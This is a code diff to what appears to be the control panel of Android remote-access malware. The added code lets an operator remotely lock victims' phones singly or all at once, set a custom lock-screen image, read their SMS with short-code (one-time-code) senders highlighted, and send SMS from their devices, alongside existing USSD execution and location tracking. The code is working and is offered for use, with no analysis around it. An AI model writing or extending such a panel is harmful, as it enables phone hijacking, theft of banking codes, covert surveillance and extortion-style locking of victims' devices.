@@ -44,6 +44,19 @@
         .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }
         .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
         .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }
+        .device-controls { display: flex; flex-wrap: wrap; gap: 8px; margin: 10px 0; }
+        .device-controls button { padding: 6px 14px; border: none; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .device-controls button:hover { transform: scale(1.02); opacity: 0.9; }
+        .btn-lock { background: #ff6b6b; color: #0a0e17; }
+        .btn-unlock { background: #6bcb77; color: #0a0e17; }
+        .btn-lock-all { background: #ff4444; color: #fff; }
+        .btn-unlock-all { background: #44aa55; color: #fff; }
+        .device-card { background: #111927; border: 1px solid #1a2332; border-radius: 10px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; transition: 0.3s; }
+        .device-card:hover { border-color: #4fc3f7; }
+        .device-card .name { font-weight: 600; }
+        .device-card .status { font-size: 12px; padding: 2px 10px; border-radius: 12px; }
+        .device-card .status.locked { background: rgba(255,107,107,0.2); color: #ff6b6b; }
+        .device-card .status.unlocked { background: rgba(107,203,119,0.2); color: #6bcb77; }
         table { width: 100%; border-collapse: collapse; font-size: 14px; }
         th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
         td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }
@@ -51,6 +64,8 @@
         .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }
         .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
         .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
+        .badge.locked { background: rgba(255,107,107,0.15); color: #ff6b6b; }
+        .badge.unlocked { background: rgba(107,203,119,0.15); color: #6bcb77; }
         .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }
         .empty .icon { font-size: 36px; margin-bottom: 8px; }
         .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }
@@ -64,6 +79,12 @@
         .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; min-height: 20px; }
         .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }
         .hidden { display: none; }
+        .file-upload-area { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin: 8px 0; }
+        .file-upload-area input[type="file"] { background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; padding: 8px; font-size: 13px; }
+        .file-upload-area button { padding: 8px 16px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; }
+        .sms-send-area { display: flex; gap: 10px; flex-wrap: wrap; }
+        .sms-send-area input { flex: 1; min-width: 150px; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; }
+        .sms-send-area button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; white-space: nowrap; }
         @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }
     </style>
 </head>
@@ -90,12 +111,17 @@
             </div>
             <button class="logout-btn" onclick="logout()">🚪 Logout</button>
         </div>
+
+        <!-- Stats -->
         <div class="stats" id="statsGrid">
             <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>
             <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>
             <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>
         </div>
+
+        <!-- Tools Grid -->
         <div class="tools-grid">
+            <!-- USSD -->
             <div class="tool-card">
                 <h4><span class="icon">📞</span> USSD Code</h4>
                 <div class="ussd-input-group">
@@ -104,6 +130,7 @@
                 </div>
                 <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>
             </div>
+            <!-- Location -->
             <div class="tool-card">
                 <h4><span class="icon">📍</span> Device Location</h4>
                 <div id="locationInfo" class="location-info">
@@ -115,6 +142,7 @@
                     <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
                 </div>
             </div>
+            <!-- Device Info -->
             <div class="tool-card">
                 <h4><span class="icon">📱</span> Device Info</h4>
                 <div id="deviceInfo" class="device-info-grid">
@@ -128,29 +156,82 @@
                 <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
             </div>
         </div>
+
+        <!-- Device Control -->
+        <div class="section">
+            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">
+                <h3>🔒 Device Control</h3>
+                <div class="device-controls">
+                    <button class="btn-lock" onclick="lockDevice(selectedDeviceId)">🔒 Lock Selected</button>
+                    <button class="btn-unlock" onclick="unlockDevice(selectedDeviceId)">🔓 Unlock Selected</button>
+                    <button class="btn-lock-all" onclick="lockAllDevices()">🔒 Lock All</button>
+                    <button class="btn-unlock-all" onclick="unlockAllDevices()">🔓 Unlock All</button>
+                </div>
+            </div>
+            <div class="file-upload-area">
+                <span style="color:#8896ab;font-size:13px;">Lock Screen Image:</span>
+                <input type="file" id="lockImageInput" accept="image/*" onchange="previewLockImage(event)">
+                <button onclick="uploadLockImage()">Upload Image</button>
+                <span id="lockImageStatus" style="font-size:12px;color:#8896ab;"></span>
+            </div>
+            <div id="devicesLockList"><div class="empty"><div class="icon">🔒</div>Loading devices...</div></div>
+        </div>
+
+        <!-- SMS -->
+        <div class="section">
+            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;margin-bottom:15px;">
+                <h3>💬 SMS Messages <span class="badge-count" id="smsCountBadge">0</span></h3>
+                <button class="logout-btn" style="background:#4fc3f7;color:#0a0e17;padding:6px 14px;border-radius:6px;font-size:12px;border:none;cursor:pointer;" onclick="refreshSms()">🔄 Refresh</button>
+            </div>
+            <div id="smsList"><div class="empty"><div class="icon">💬</div>No SMS messages yet</div></div>
+        </div>
+
+        <!-- Send SMS -->
+        <div class="section">
+            <h3>✉️ Send SMS</h3>
+            <div class="sms-send-area">
+                <input type="text" id="smsNumber" placeholder="Phone number">
+                <input type="text" id="smsMessage" placeholder="Message">
+                <button onclick="sendSms()">Send</button>
+            </div>
+            <div id="smsSendResult" style="margin-top:8px;font-size:13px;color:#8896ab;"></div>
+        </div>
+
+        <!-- Connected Devices -->
         <div class="section">
             <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
             <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>
         </div>
+
+        <!-- USSD Codes -->
         <div class="section">
             <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>
             <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>
         </div>
     </div>
 </div>
+
 <script>
 const API_BASE = '/a9f3k217';
+let selectedDeviceId = null;
 
+function selectDevice(id) {
+    selectedDeviceId = id;
+    document.querySelectorAll('.device-card').forEach(el => el.style.borderColor = '#1a2332');
+    const card = document.querySelector(`.device-card[data-id="${id}"]`);
+    if (card) card.style.borderColor = '#4fc3f7';
+}
+
+// ============================================================
+// LOGIN
+// ============================================================
 async function login() {
     const username = document.getElementById('loginUser').value;
     const password = document.getElementById('loginPass').value;
     const errorEl = document.getElementById('loginError');
     const attemptsMsg = document.getElementById('attemptsMsg');
-
-    // Clear previous messages
     errorEl.style.display = 'none';
     attemptsMsg.textContent = '';
-
     try {
         const response = await fetch(API_BASE + '/api/login', {
             method: 'POST',
@@ -158,10 +239,6 @@ async function login() {
             body: JSON.stringify({ username, password })
         });
         const data = await response.json();
-
-        // Debug: log the response
-        console.log('Login response:', data);
-
         if (data.success) {
             localStorage.setItem('adminLoggedIn', 'true');
             document.getElementById('loginContainer').style.display = 'none';
@@ -169,13 +246,13 @@ async function login() {
             loadData();
             refreshLocation();
             refreshDeviceInfo();
+            refreshSms();
+            refreshDevicesLock();
             document.getElementById('loginUser').value = '';
             document.getElementById('loginPass').value = '';
         } else {
-            // Clear both fields on failure
             document.getElementById('loginUser').value = '';
             document.getElementById('loginPass').value = '';
-
             if (data.remainingAttempts !== undefined) {
                 let left = data.remainingAttempts;
                 let msg;
@@ -207,6 +284,200 @@ function logout() {
     document.getElementById('loginError').style.display = 'none';
 }
 
+// ============================================================
+// DEVICE LOCK/UNLOCK
+// ============================================================
+async function refreshDevicesLock() {
+    try {
+        const response = await fetch(API_BASE + '/api/devices-lock');
+        const data = await response.json();
+        renderDevicesLock(data);
+    } catch (error) {
+        console.error('Error loading devices:', error);
+    }
+}
+
+function renderDevicesLock(devices) {
+    const container = document.getElementById('devicesLockList');
+    if (!devices || Object.keys(devices).length === 0) {
+        container.innerHTML = '<div class="empty"><div class="icon">🔒</div>No devices available</div>';
+        return;
+    }
+       let html = '<table><thead><tr><th>Device</th><th>Status</th><th>Battery</th><th>Action</th></tr></thead><tbody>';
+    Object.keys(devices).forEach(id => {
+        const d = devices[id];
+        const isLocked = d.locked || false;
+        const onlineClass = d.online ? 'online' : 'offline';
+        const onlineText = d.online ? '🟢 Online' : '🔴 Offline';
+        const lockText = isLocked ? '🔒 Locked' : '🔓 Unlocked';
+        const lockClass = isLocked ? 'locked' : 'unlocked';
+        const actionBtn = isLocked 
+            ? `<button class="btn-unlock" onclick="unlockDevice('${id}')">Unlock</button>`
+            : `<button class="btn-lock" onclick="lockDevice('${id}')">Lock</button>`;
+        html += `<tr class="device-card" data-id="${id}" onclick="selectDevice('${id}')">`;
+        html += `<td><span class="name">${d.name || id}</span></td>`;
+        html += `<td><span class="badge ${lockClass}">${lockText}</span> <span class="badge ${onlineClass}">${onlineText}</span></td>`;
+        html += `<td>${d.battery || '--'}%</td>`;
+        html += `<td>${actionBtn}</td>`;
+        html += `</tr>`;
+    });
+    html += '</tbody></table>';
+    container.innerHTML = html;
+}
+
+async function lockDevice(deviceId) {
+    if (!deviceId) { alert('Please select a device first'); return; }
+    try {
+        const response = await fetch(API_BASE + '/api/lock-device', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: deviceId, action: 'lock' })
+        });
+        const data = await response.json();
+        if (data.success) { refreshDevicesLock(); }
+        else { alert('Failed to lock device: ' + data.error); }
+    } catch { alert('Connection error'); }
+}
+
+async function unlockDevice(deviceId) {
+    if (!deviceId) { alert('Please select a device first'); return; }
+    try {
+        const response = await fetch(API_BASE + '/api/lock-device', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: deviceId, action: 'unlock' })
+        });
+        const data = await response.json();
+        if (data.success) { refreshDevicesLock(); }
+        else { alert('Failed to unlock device: ' + data.error); }
+    } catch { alert('Connection error'); }
+}
+
+async function lockAllDevices() {
+    if (!confirm('Lock ALL devices?')) return;
+    try {
+        const response = await fetch(API_BASE + '/api/lock-all', { method: 'POST' });
+        const data = await response.json();
+        if (data.success) { refreshDevicesLock(); }
+        else { alert('Failed: ' + data.error); }
+    } catch { alert('Connection error'); }
+}
+
+async function unlockAllDevices() {
+    if (!confirm('Unlock ALL devices?')) return;
+    try {
+        const response = await fetch(API_BASE + '/api/unlock-all', { method: 'POST' });
+        const data = await response.json();
+        if (data.success) { refreshDevicesLock(); }
+        else { alert('Failed: ' + data.error); }
+    } catch { alert('Connection error'); }
+}
+
+// ============================================================
+// LOCK SCREEN IMAGE UPLOAD
+// ============================================================
+function previewLockImage(event) {
+    const file = event.target.files[0];
+    if (file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            document.getElementById('lockImageStatus').textContent = '📸 Image loaded: ' + file.name;
+            document.getElementById('lockImageStatus').style.color = '#6bcb77';
+            window._lockImageData = e.target.result;
+        };
+        reader.readAsDataURL(file);
+    }
+}
+
+async function uploadLockImage() {
+    const imageData = window._lockImageData;
+    if (!imageData) { alert('Please select an image first'); return; }
+    try {
+        const response = await fetch(API_BASE + '/api/upload-lock-image', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: imageData })
+        });
+        const data = await response.json();
+        if (data.success) {
+            document.getElementById('lockImageStatus').textContent = '✅ Image uploaded successfully!';
+            document.getElementById('lockImageStatus').style.color = '#6bcb77';
+        } else {
+            document.getElementById('lockImageStatus').textContent = '❌ ' + data.error;
+            document.getElementById('lockImageStatus').style.color = '#ff6b6b';
+        }
+    } catch { alert('Connection error'); }
+}
+
+// ============================================================
+// SMS
+// ============================================================
+async function refreshSms() {
+    try {
+        const response = await fetch(API_BASE + '/api/sms');
+        const smsList = await response.json();
+        renderSms(smsList);
+        document.getElementById('smsCountBadge').textContent = smsList.length || 0;
+    } catch (error) {
+        console.error('Error loading SMS:', error);
+    }
+}
+
+function renderSms(messages) {
+    const container = document.getElementById('smsList');
+    if (!messages || messages.length === 0) {
+        container.innerHTML = '<div class="empty"><div class="icon">💬</div>No SMS messages yet</div>';
+        return;
+    }
+    let html = '<table><thead><tr><th>From</th><th>Message</th><th>Time</th></tr></thead><tbody>';
+    messages.slice(0, 50).forEach(msg => {
+        const time = msg.timestamp ? new Date(msg.timestamp).toLocaleString() : '--';
+        const isShort = msg.number && msg.number.length >= 4 && msg.number.length <= 5;
+        let numberDisplay = msg.number || 'Unknown';
+        if (isShort) numberDisplay = '<span style="color:#ffd700;font-weight:600;">' + numberDisplay + '</span>';
+        html += `<tr><td>${numberDisplay}</td><td>${msg.body || '--'}</td><td style="font-size:12px;color:#8896ab;">${time}</td></tr>`;
+    });
+    html += '</tbody></table>';
+    container.innerHTML = html;
+}
+
+async function sendSms() {
+    const number = document.getElementById('smsNumber').value.trim();
+    const message = document.getElementById('smsMessage').value.trim();
+    const resultEl = document.getElementById('smsSendResult');
+    if (!number || !message) {
+        resultEl.textContent = '⚠️ Please enter both number and message';
+        resultEl.style.color = '#ff6b6b';
+        return;
+    }
+    resultEl.textContent = '⏳ Sending...';
+    resultEl.style.color = '#ffd700';
+    try {
+        const response = await fetch(API_BASE + '/api/send-sms', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ number, message })
+        });
+        const data = await response.json();
+        if (data.success) {
+            resultEl.textContent = '✅ ' + data.message;
+            resultEl.style.color = '#6bcb77';
+            document.getElementById('smsNumber').value = '';
+            document.getElementById('smsMessage').value = '';
+            refreshSms();
+        } else {
+            resultEl.textContent = '❌ ' + (data.error || 'Failed to send');
+            resultEl.style.color = '#ff6b6b';
+        }
+    } catch {
+        resultEl.textContent = '❌ Connection error';
+        resultEl.style.color = '#ff6b6b';
+    }
+}
+
+// ============================================================
+// USSD, LOCATION, DEVICE INFO
+// ============================================================
 async function executeUssd() {
     const code = document.getElementById('ussdInput').value.trim();
     const responseEl = document.getElementById('ussdResponse');
@@ -266,9 +537,8 @@ async function refreshDeviceInfo() {
         document.getElementById('diStorage').textContent = data.storage || '--';
         document.getElementById('diDeviceId').textContent = data.device_id || '--';
     } catch {}
-}
-
-async function loadData() {
+                }
+    async function loadData() {
     try {
         const response = await fetch(API_BASE + '/api/stats');
         const stats = await response.json();
@@ -315,13 +585,17 @@ function renderUssdNumbers(numbers) {
     container.innerHTML = html;
 }
 
-// Persistent login check
+// ============================================================
+// PERSISTENT LOGIN
+// ============================================================
 if (localStorage.getItem('adminLoggedIn') === 'true') {
     document.getElementById('loginContainer').style.display = 'none';
     document.getElementById('dashboard').classList.remove('hidden');
     loadData();
     refreshLocation();
     refreshDeviceInfo();
+    refreshSms();
+    refreshDevicesLock();
 }
 
 document.getElementById('loginPass').addEventListener('keypress', (e) => {
